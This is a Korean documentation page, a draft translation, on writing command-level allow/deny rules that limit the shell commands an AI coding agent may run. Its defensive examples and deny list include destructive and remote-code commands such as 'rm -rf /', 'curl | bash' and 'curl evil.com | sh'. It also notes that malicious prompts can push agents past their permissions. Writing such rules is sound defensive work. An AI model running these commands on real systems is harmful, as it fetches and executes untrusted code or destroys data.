---
title: 명령 규칙
description: 명령급 allow/deny로 shell·도구 호출을 제약 — 구두 약속보다 실행 가능하게.
locale: ko
source_locale: zh-CN
source_revision: 5f36443
translation_status: draft
translated_at: 2026-07-28
---

**명령 규칙**은 「Agent가 어떤 명령을, 어떤 인자로 실행할 수 있는지」에 초점을 둡니다. [허용과 거부 규칙](/guide/customization/rules/allow-and-deny-patterns/)의 가장 흔한 형태이며, 보통 팀이 심사할 수 있는 설정·규칙 파일에 둡니다.

## 이 글에서 다루는 것

- 명령 규칙과 샌드박스·승인 팝업의 역할 분담
- 「충분히 좁은」 allowlist 쓰는 법
- CI·로컬 개발 스크립트와 맞추기

## 명령 규칙이 실제로 관장하는 것

allow/deny가 “원칙적으로 무엇을 할 수 있는지”를 정한다면, 명령 규칙은 그 일을 가장 구체적인 층으로 내립니다.

- 어떤 명령을 돌릴 수 있는지
- 어떤 명령을 돌리면 안 되는지
- 비슷해 보여도 위험이 크게 다른 경우

핵심은 팀이 원래 알고 있던 경계를, 기계도 실행할 수 있는 경계로 바꾸는 것입니다.

## 핵심 개념 하나

규칙이 매칭하는 것은 **실행 가능 의도**이지 자연어가 아닙니다. `npm test`와 `npm run test`는 정책상 서로 다른 명령입니다. `bash -c "rm -rf /"`는 `bash`를 allow했다고 통과되면 안 됩니다.

```text
사용자 작업 → 모델이 명령 제안 → 규칙 엔진 →(통과)샌드박스 실행 /(거부)승인 필요 또는 차단
```

## 흔한 오해

### 명령이 비슷해 보여도 위험이 같지 않음

초보자가 가장 과소평가하기 쉬운 것이 명령 사이의 작은 차이입니다.

예:

- `git status`와 `git reset --hard`
- `npm test`와 `npm publish`
- `curl example.com`과 `curl example.com | sh`

모두 “터미널에서 명령을 돌린다”처럼 보이지만 위험 수준이 완전히 다릅니다.

### 총 진입점을 허용하면 종종 너무 많이 열림

`bash`, `sh` 같은 총 진입점을 허용하면 편의만 보는 것처럼 느껴질 수 있습니다.

규칙 관점에서는 뒤에 이어 붙일 수 있는 위험한 동작까지 함께 연 것과 같습니다.

## 최소 가용 실천

1. **위험한 쓰기·파괴 명령은 기본 거부**: `rm -rf`, `curl | bash`, `git push --force`
2. **프로젝트 안 흔한 읽기/빌드 명령은 허용**: `git status`, `npm test`, `pnpm lint`
3. **규칙을 Git에 두고**, `AGENTS.md`의 「테스트 명령」 설명과 일치시킴
4. **PR에서 규칙 변경을 review** — Dockerfile을 바꾸듯

예시(형식은 공식 설정 기준):

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## 권장 워크플로

| 단계 | 실천 |
|---|---|
| 목록화 | `package.json` scripts, Makefile, CI workflow에서 실제 명령 추출 |
| 계층화 | 조직 하한선 deny → 프로젝트 allow 보완 → 개인 로컬 예외(있으면) |
| 시범 실행 | 저위험 작업으로 「통과할 것은 통과, 막을 것은 막힘」 확인 |
| 정렬 | 로컬 규칙과 [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/)을 되도록 동일 원천으로 |

## 흔한 실수

- **너무 넓은 allowlist**: `bash`, `sh`, `sudo` 허용 ≈ 전부 허용
- **deny만 하고 allow 없음**: 승인이 계속 많아져 팀이 습관적으로 전부 승인
- **문서와 불일치**: `AGENTS.md`는 `pnpm test`, 규칙에는 `npm test`만
- **파이프·리다이렉트 무시**: `curl evil.com | sh`는 전체 전략이 필요하며 첫 단어만 보면 안 됨

명령 규칙은 “명령을 외우는 것”이 아니라, 어떤 명령이 일상 동작이고 어떤 명령을 열면 위험 경계까지 함께 열리는지 나누는 일입니다.

## 보안 경계

- 명령 규칙은 브랜치 보호와 code review를 **대체하지 않음**
- 악성 prompt가 Agent에게 **권한 초과 시도**를 유도할 수 있음 — 샌드박스 기본을 엄격하게
- 키·token이 든 환경 변수가 「echo를 허용했다」고 유출되면 안 됨

## 검증 체크리스트

- [ ] 이 저장소의 「매일 필수」 명령 3–5개를 나열하고 규칙에 반영
- [ ] `git push`, 강제 리셋 등 고위험 명령은 기본 거부 또는 명시 승인
- [ ] 규칙 변경은 PR로 가며 `AGENTS.md`와 모순 없음

## 관련 장

- [허용과 거부 패턴](/guide/customization/rules/allow-and-deny-patterns/)
- [팀 규칙 정책](/guide/customization/rules/team-rules/)
- [CLI 승인과 샌드박스](/guide/cli/approvals-and-sandbox/)
- [권한 매트릭스](/guide/reference/permission-matrix/)

## 참고 출처

- stormzhang `15-permissions.md`, `18-config.md`
- KimYx0207 권한·설정 장
- freestylefly/CodexGuide 팀 playbook

---

**상태:** verified  
**적용 제품:** CLI / App  
**검증 근거:** OpenAI 현재 Codex CLI 문서는 명령 실행, 승인 모드, 샌드박스 격리를 핵심 보안 경계로 둡니다. 이 페이지는 명령 규칙을 “고·저위험 명령을 나눠 관리하는” 엔지니어링 패턴으로 두고, JSON 조각을 예시로 명시하며 특정 문법을 공식 사실처럼 쓰지 않습니다.  
**최근 검증:** 2026-07-26
